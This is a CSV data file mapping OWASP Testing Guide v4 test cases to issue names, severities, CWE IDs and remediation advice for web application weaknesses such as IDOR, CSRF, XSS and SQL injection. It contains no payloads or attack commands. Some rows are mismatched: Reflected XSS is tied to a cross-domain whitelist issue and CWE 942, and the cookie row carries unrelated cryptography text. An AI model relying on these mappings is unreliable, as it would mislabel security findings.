TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
OTG4-4.06.02,OWASP-TG4,Testing for Bypassing Authorization Schema (OTG-AUTHZ-002),,,Insufficient server-side authorization check,,3,,4.6 Authorization Testing,,4.06.02,The software does not perform an authorization check when an actor attempts to access a resource or perform an action.,"PHASE:Architecture and Design
DESCRIPTION:Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries. Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.

PHASE:Architecture and Design
DESCRIPTION:Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].

PHASE:Architecture and Design
DESCRIPTION:For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page. One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.

PHASE:System Configuration Installation
DESCRIPTION:Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a default deny policy when defining these ACLs.",true,https://www.owasp.org/index.php/Testing_for_Authorization,https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Access_Control_Cheat_Sheet.md,https://www.owasp.org/index.php/Testing_for_Bypassing_Authorization_Schema_(OTG-AUTHZ-002),862,true,true,
OTG4-4.06.03,OWASP-TG4,Testing for Privilege escalation (OTG-AUTHZ-003),,,,,,,4.6 Authorization Testing,,4.06.03,,,,,,https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003),,false,true,
OTG4-4.07.01,OWASP-TG4,Testing for Session Management Schema (OTG-SESS-001),,,,,,,4.7 Session Mgmt Testing,,4.07.01,,,,,,https://www.owasp.org/index.php/Testing_for_Session_Management_Schema_(OTG-SESS-001),,,true,
OTG4-4.06.04,OWASP-TG4,Testing for Insecure Direct Object References (OTG-AUTHZ-004) (IDOR),,,Insecure Direct Object Reference (IDOR),,3,,4.6 Authorization Testing,,4.06.04,The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.,"PHASE:Architecture and Design
DESCRIPTION:For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.

PHASE:Architecture and Design Implementation
DESCRIPTION:Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.

PHASE:Architecture and Design
DESCRIPTION:Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.",true,,,https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004),639,true,false,
OTG4-4.07.03,OWASP-TG4,Testing for Session Fixation (OTG-SESS-003),,,Session Fixation,,3,,4.7 Session Mgmt Testing,,4.07.03,"Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.","PHASE:Architecture and Design
DESCRIPTION:Invalidate any existing session identifiers prior to authorizing a new user session.

PHASE:Architecture and Design
DESCRIPTION:For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.",true,,,https://www.owasp.org/index.php/Testing_for_Session_Fixation_(OTG-SESS-003),384,true,true,
OTG4-4.07.04,OWASP-TG4,Testing for Exposed Session Variables (OTG-SESS-004),,,,,,,4.7 Session Mgmt Testing,,4.07.04,,,,,,https://www.owasp.org/index.php/Testing_for_Exposed_Session_Variables_(OTG-SESS-004),,true,true,
OTG4-4.07.02,OWASP-TG4,Testing for cookies attributes (OTG-SESS-002),,,Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,,1,,4.7 Session Mgmt Testing,,4.07.02,"The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.

Select the appropriate type of cryptography for the intended purpose. Avoid proprietary encryption algorithms as they typically rely on ""security through obscurity"" rather than sound mathematics. Select key sizes appropriate for the data being protected; for high assurance applications, 256-bit symmetric keys and 2048-bit asymmetric keys are sufficient. Follow best practices for key storage, and ensure that plaintext data and key material are not inadvertently exposed.

Applications commonly use cryptography to implement authentication mechanisms and to ensure the confidentiality and integrity of sensitive data, both in transit and at rest. The proper and accurate implementation of cryptography is extremely critical to its efficacy. Configuration or coding mistakes as well as incorrect assumptions may negate a large degree of the protection it affords, leaving the crypto implementation vulnerable to attack.
Common cryptographic mistakes include, but are not limited to, selecting weak keys or weak cipher modes, unintentionally exposing sensitive cryptographic data, using predictable entropy sources, and mismanaging or hard-coding keys.
Developers often make the dangerous assumption that they can improve security by designing their own cryptographic algorithm; however, one of the basic tenets of cryptography is that any cipher whose effectiveness is reliant on the secrecy of the algorithm is fundamentally flawed.",Set the Secure attribute for all cookies used by HTTPS sessions.,true,,,https://www.owasp.org/index.php/Testing_for_cookies_attributes_(OTG-SESS-002),614,true,true,
OTG4-4.07.06,OWASP-TG4,Testing for logout functionality (OTG-SESS-006),,,,,,,4.7 Session Mgmt Testing,,4.07.06,,,,,,https://www.owasp.org/index.php/Testing_for_logout_functionality_(OTG-SESS-006),,true,true,
OTG4-4.07.07,OWASP-TG4,Test Session Timeout (OTG-SESS-007),,,Insufficient Session Expiration,,2,,4.7 Session Mgmt Testing,,4.07.07,Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.,"PHASE:Implementation
DESCRIPTION:Set sessions/credentials expiration date.",true,,,https://www.owasp.org/index.php/Test_Session_Timeout_(OTG-SESS-007),613,true,true,
OTG4-4.07.08,OWASP-TG4,Testing for Session puzzling (OTG-SESS-008),,,,,,,4.7 Session Mgmt Testing,,4.07.08,,,,,,https://www.owasp.org/index.php/Testing_for_Session_puzzling_(OTG-SESS-008),,,true,
OTG4-4.07.05,OWASP-TG4,Testing for CSRF (OTG-SESS-005),,,Cross-Site Request Forgery (CSRF),,2,,4.7 Session Mgmt Testing,,4.07.05,"The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.
It is possible to trick a user into executing potentially dangerous actions against the target site due to a lack of Cross- Site-Request-Forgery (CSRF) protections. CSRF attacks are a class of confused deputy attacks that exploit the behavior of browsers always sending authorization cookies in requests. The target site has no secure way of verifying the request was initiated from a link on a trusted domain.
Effort to Fix: 4 - Simple design error. Requires redesign and up to 5 days to fix.
","Protect all forms by generating a random unique nonce value each time the page is requested. This nonce value should be included into the form as a parameter, usually as a hidden input field. These nonce values should be linked to the user's session ID and validated on submission by comparing the generated nonce value for the form with the one that was submitted by the user. When possible, use built in CSRF protections offered by various vetted libraries or frameworks instead of developing a custom implementation.

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330] Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]

PHASE:Implementation
DESCRIPTION:Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.

PHASE:Architecture and Design
DESCRIPTION:Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]

PHASE:Architecture and Design
DESCRIPTION:Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.

PHASE:Architecture and Design
DESCRIPTION:Use the double-submitted cookie method as described by Felten and Zeller: When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same. Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult. This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]

PHASE:Architecture and Design
DESCRIPTION:Do not use the GET method for any request that triggers a state change.

PHASE:Implementation
DESCRIPTION:Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.",true,,,https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005),352,true,true,
OTG4-4.08.01,OWASP-TG4,Testing for Reflected XSS (OTG-INPVAL-001),,,Overly Permissive Cross-domain Whitelist,,2,,4.8 Input Validation Testing,,4.08.01,"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as <, >, and & that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.","PHASE:Architecture and Design
STRATEGY:Attack Surface Reduction
DESCRIPTION:Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.

PHASE:Architecture and Design Operation
STRATEGY:Environment Hardening
DESCRIPTION:For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.

PHASE:Architecture and Design Operation
STRATEGY:Attack Surface Reduction
DESCRIPTION:For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.",true,https://cwe.mitre.org/data/definitions/116.html,https://cwe.mitre.org/data/definitions/20.html,https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001),942,true,true,
OTG4-4.08.02,OWASP-TG4,Testing for Stored XSS (OTG-INPVAL-002),,,Stored XSS,,3,,4.8 Input Validation Testing,,4.08.02,"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as <, >, and & that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.","PHASE:Implementation
DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.

PHASE:Implementation
STRATEGY:Output Encoding
DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.

PHASE:Implementation
DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.

PHASE:Implementation
STRATEGY:Attack Surface Reduction
EFFECTIVENESS:Defense in Depth
DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.",true,,,https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002),80,true,true,
OTG4-4.08.03,OWASP-TG4,Testing for HTTP Verb Tampering (OTG-INPVAL-003),,,,,,,4.8 Input Validation Testing,,4.08.03,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003),,,true,
OTG4-4.08.04,OWASP-TG4,Testing for HTTP Parameter pollution (OTG-INPVAL-004),,,,,,,4.8 Input Validation Testing,,4.08.04,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004),,,true,
OTG4-4.08.05.01,OWASP-TG4,Testing for Oracle SQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.01,,,,,,https://www.owasp.org/index.php/Testing_for_Oracle,89,,true,
OTG4-4.08.05.02,OWASP-TG4,Testing for MySQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.02,,,,,,https://www.owasp.org/index.php/Testing_for_MySQL,89,,true,
OTG4-4.08.05,OWASP-TG4,Testing for SQL Injection (OTG-INPVAL-005),,,SQL Injection,,3,,4.8 Input Validation Testing,,4.08.05,"The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.","PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.

PHASE:Architecture and Design
STRATEGY:Parameterization
DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using exec or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]

PHASE:Architecture and Design Operation
STRATEGY:Environment Hardening
DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.

PHASE:Architecture and Design
DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

PHASE:Implementation
STRATEGY:Output Encoding
DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88). Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name O'Reilly would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the ' apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded. When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.

PHASE:Architecture and Design
STRATEGY:Enforcement by Conversion
DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

PHASE:Implementation
DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not. In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.

PHASE:Operation
STRATEGY:Firewall
EFFECTIVENESS:Moderate
DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.

PHASE:Operation Implementation
STRATEGY:Environment Hardening
DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.",true,,,https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005),89,true,true,
OTG4-4.08.05.05,OWASP-TG4,Testing for MS Access SQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.05,,,,,,https://www.owasp.org/index.php/Testing_for_MS_Access,89,,true,
OTG4-4.08.05.03,OWASP-TG4,Testing for SQL Server Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.03,,,,,,https://www.owasp.org/index.php/Testing_for_SQL_Server,89,,true,
OTG4-4.08.05.06,OWASP-TG4,Testing for NoSQL injection,,,NoSQL Injection,,3,,4.8 Input Validation Testing,,4.08.05.06,"The application generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.",,,,,https://www.owasp.org/index.php/Testing_for_NoSQL_injection,943,true,true,
OTG4-4.08.05.04,OWASP-TG4,Testing for PostgreSQL SQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.04,,,,,,https://www.owasp.org/index.php/OWASP_Backend_Security_Project_Testing_PostgreSQL,89,,true,
OTG4-4.08.06,OWASP-TG4,Testing for LDAP Injection (OTG-INPVAL-006),,,LDAP Injection,,2,,4.8 Input Validation Testing,,4.08.06,"The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.","PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.",true,https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.md,https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006),https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006),90,true,true,
OTG4-4.08.07,OWASP-TG4,Testing for ORM Injection (OTG-INPVAL-007),,,,,,,4.8 Input Validation Testing,,4.08.07,,,,,,https://www.owasp.org/index.php/Testing_for_ORM_Injection_(OTG-INPVAL-007),91,false,true,
OTG4-4.08.08,OWASP-TG4,Testing for XML Injection (OTG-INPVAL-008),,,Improper Restriction of XML External Entity Reference (XXE),,0,,4.8 Input Validation Testing,,4.08.08,"The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.","PHASE:Implementation System Configuration
DESCRIPTION:Many XML parsers and validators can be configured to disable external entity expansion.",true,https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008),,https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008),611,false,true,
OTG4-4.08.11,OWASP-TG4,Testing for IMAP/SMTP Injection (OTG-INPVAL-011),,,,,,,4.8 Input Validation Testing,,4.08.11,,,,,,https://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OTG-INPVAL-011),,false,true,
OTG4-4.08.12,OWASP-TG4,Testing for Code Injection (OTG-INPVAL-012),,,,,,,4.8 Input Validation Testing,,4.08.12,,,,,,https://www.owasp.org/index.php/Testing_for_Code_Injection_(OTG-INPVAL-012),,false,true,
OTG4-4.08.09,OWASP-TG4,Testing for SSI Injection (OTG-INPVAL-009),,,,,,,4.8 Input Validation Testing,,4.08.09,,,,,,https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009),97,false,true,
OTG4-4.08.10,OWASP-TG4,Testing for XPath Injection (OTG-INPVAL-010),,,,,,,4.8 Input Validation Testing,,4.08.10,,,,,,https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010),643,false,true,
OTG4-4.08.12.02,OWASP-TG4,Testing for Remote File Inclusion,,,,,,,4.8 Input Validation Testing,,4.08.12.02,,,,,,https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion,98,true,true,
OTG4-4.08.13,OWASP-TG4,Testing for Command Injection / RCE (OTG-INPVAL-013),,,Command Injection (RCE),,3,,4.8 Input Validation Testing,,4.08.13,"The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.","PHASE:Architecture and Design
DESCRIPTION:If at all possible, use library calls rather than external processes to recreate the desired functionality.

PHASE:Implementation
DESCRIPTION:If possible, ensure that all external commands called from the program are statically created.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

PHASE:Operation
DESCRIPTION:Run time: Run time policy enforcement may be used in a whitelist fashion to prevent use of any non-sanctioned commands.

PHASE:System Configuration
DESCRIPTION:Assign permissions to the software system that prevents the user from accessing/opening privileged files.::",true,,,https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013),78,false,true,
OTG4-4.08.14,OWASP-TG4,Testing for Buffer Overflow (OTG-INPVAL-014),,,,,,,4.8 Input Validation Testing,,4.08.14,,,,,,https://www.owasp.org/index.php/Testing_for_Buffer_Overflow_(OTG-INPVAL-014),121,false,true,
OTG4-4.08.14.02,OWASP-TG4,Testing for Stack Overflow,,,,,,,4.8 Input Validation Testing,,4.08.14.02,,,,,,https://www.owasp.org/index.php/Testing_for_Stack_Overflow,121,false,true,
OTG4-4.08.14.03,OWASP-TG4,Testing for Format String,,,,,,,4.8 Input Validation Testing,,4.08.14.03,,,,,,https://www.owasp.org/index.php/Testing_for_Format_String,134,,true,
OTG4-4.08.15,OWASP-TG4,Testing for Incubated Vulnerability (OTG-INPVAL-015),,,,,,,4.8 Input Validation Testing,,4.08.15,,,,,,https://www.owasp.org/index.php/Testing_for_Incubated_Vulnerability_(OTG-INPVAL-015),,,true,
OTG4-4.08.16,OWASP-TG4,Testing for HTTP Splitting/Smuggling (OTG-INPVAL-016),,,,,,,4.8 Input Validation Testing,,4.08.16,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016),113,true,true,
OTG4-4.08.17,OWASP-TG4,Testing for HTTP Incoming requests (OTG-INPVAL-017),,,,,,,4.8 Input Validation Testing,,4.08.17,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Incoming_requests_(OTG-INPVAL-017),,,true,
OTG4-4.08.14.01,OWASP-TG4,Testing for Heap Overflow,,,Heap-based Buffer Overflow,,2,,4.8 Input Validation Testing,,4.08.14.01,"A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().","PHASE:
DESCRIPTION:Pre-design: Use a language or compiler that performs automatic bounds checking.

PHASE:Architecture and Design
DESCRIPTION:Use an abstraction library to abstract away risky APIs. Not a complete solution.

PHASE:Build and Compilation
DESCRIPTION:Pre-design through Build: Canary style bounds checking, library changes which ensure the validity of chunk data, and other such fixes are possible, but should not be relied upon.

PHASE:Implementation
DESCRIPTION:Implement and perform bounds checking on input.

PHASE:Implementation
STRATEGY:Libraries or Frameworks
DESCRIPTION:Do not use dangerous functions such as gets. Look for their safe equivalent, which checks for the boundary.

PHASE:Operation
DESCRIPTION:Use OS-level preventative functionality. This is not a complete solution, but it provides some defense in depth.::",,,,https://www.owasp.org/index.php/Testing_for_Heap_Overflow,122,false,true,
OTG4-4.09.01,OWASP-TG4,Test for Error Code,,,Unchecked Error Condition,,2,,4.9 Testing for Error Handling,,4.09.01,,"PHASE:Requirements
DESCRIPTION:The choice between a language which has named or unnamed exceptions needs to be done. While unnamed exceptions exacerbate the chance of not properly dealing with an exception, named exceptions suffer from the up call version of the weak base class problem.

PHASE:Requirements
DESCRIPTION:A language can be used which requires, at compile time, to catch all serious exceptions. However, one must make sure to use the most current version of the API as new exceptions could be added.

PHASE:Implementation
DESCRIPTION:Catch all relevant exceptions. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.",true,,,https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001),391,true,true,
